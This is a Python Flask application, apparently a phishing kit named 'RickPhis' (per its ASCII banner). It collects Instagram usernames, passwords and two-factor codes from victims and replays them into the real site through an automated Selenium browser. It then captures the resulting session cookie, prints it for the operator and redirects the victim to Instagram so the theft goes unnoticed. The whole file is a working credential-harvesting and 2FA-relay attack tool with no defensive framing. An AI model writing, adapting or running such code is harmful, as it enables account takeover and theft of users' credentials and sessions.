from flask import Flask, request, render_template, redirect, url_for
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from flask import Flask, redirect, request, make_response
from selenium.webdriver.support import expected_conditions as EC
import time

app = Flask(__name__)

logo = """  _____  _      _    _____  _     _     
 |  __ \\(_)    | |  |  __ \\| |   (_)    
 | |__) |_  ___| | _| |__) | |__  _ ___ 
 |  _  /| |/ __| |/ /  ___/| '_ \\| / __|
 | | \\ \\| | (__|   <| |    | | | | \\__ \\
 |_|  \\_\\_|\\___|_|\\_\\_|    |_| |_|_|___/
                                        """

print(logo)

driver = None

def validate_length(field_name, value, max_length=150):
    if not value or len(value) > max_length:
        return f"{field_name} must be at most {max_length} characters long."
    return None

def login_insta(username, password):
    global driver
    chrome_options = Options()
    chrome_options.add_argument("--disable-extensions")
    chrome_options.add_argument("--start-maximized")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-infobars")
    chrome_options.add_argument("--disable-notifications")

    driver = webdriver.Chrome(options=chrome_options)
    try:
        driver.get("https://www.instagram.com/")
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "username")))

        username_field = driver.find_element(By.NAME, "username")
        username_field.send_keys(username)

        password_field = WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.NAME, "password")))
        password_field.send_keys(password)

        login_button = WebDriverWait(driver, 10).until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']")))
        login_button.click()

        time.sleep(5)

        try:
            error_elements = driver.find_elements(By.CSS_SELECTOR, "p#slfErrorAlert, div.xkmlbd1")
            for element in error_elements:
                error_text = element.text.strip()
                if error_text:
                    if "Sorry, your password was incorrect" in error_text:
                        return "Sorry, your password was incorrect. Please try again."
                    elif "The username you entered doesn't belong to an account" in error_text:
                        return "The username you entered doesn't belong to an account. Please try again."
                    elif "Please wait a few minutes before you try again" in error_text:
                        return "Please wait a few minutes before you try again."
                    else:
                        return error_text
        except:
            pass

        try:
            verification_message = driver.find_element(By.NAME, "verificationCode").get_attribute("aria-label")
            if "Security Code" in verification_message:
                return "Two-factor authentication"
        except:
            pass

        cookies = driver.get_cookies()
        session_id = None

        for cookie in cookies:
            if cookie['name'] == 'sessionid':
                session_id = cookie['value']
                break

        if session_id:
            print(f"Session ID: {session_id}")
            return "Login successful"
        else:
            return "An error occurred. Please try again later."

    except Exception as e:
        return f"An error occurred: {str(e)}"
    finally:
        if driver and "Login successful" not in locals():
            driver.quit()


@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')

        error = validate_length("Username", username) or validate_length("Password", password)
        if error:
            return render_template('index.html', result=error)

        result = login_insta(username, password)
        if result == "Two-factor authentication":
            return redirect(url_for('two_factor'))

        return render_template('index.html', result=result)
    return render_template('index.html')


@app.route('/2fa', methods=['GET'])
def two_factor():
    return render_template('2fa.html')


@app.route('/verify', methods=['POST'])
def verify_code():
    global driver
    if driver is None:
        return "Browser session is not available. Please log in again."

    security_code = request.form.get('security_code')

    error = validate_length("Verification code", security_code)
    if error:
        return render_template('2fa.html', result=error)

    try:
        code_input = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.NAME, "verificationCode"))
        )
        code_input.send_keys(security_code)

        confirm_button = WebDriverWait(driver, 10).until(
            EC.element_to_be_clickable((By.CSS_SELECTOR, "button._acan._acap._acas._aj1-._ap30"))
        )
        confirm_button.click()

        try:
            error_message = WebDriverWait(driver, 5).until(
                EC.presence_of_element_located((By.ID, "twoFactorErrorAlert"))
            )
            return render_template('2fa.html', result="Please check the security code and try again.")
        except:
            cookies = driver.get_cookies()
            session_id = None
            for cookie in cookies:
                if cookie['name'] == 'sessionid':
                    session_id = cookie['value']
                    break

            if session_id:
                print(f"Session ID: {session_id}")
                response = make_response(redirect("https://www.instagram.com"))
                response.set_cookie('session_id', session_id)
                return response
            else:
                return render_template('2fa.html', result="Verification successful but session ID not found.")
    except Exception as e:
        return render_template('2fa.html', result=f"An error occurred: {e}")


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
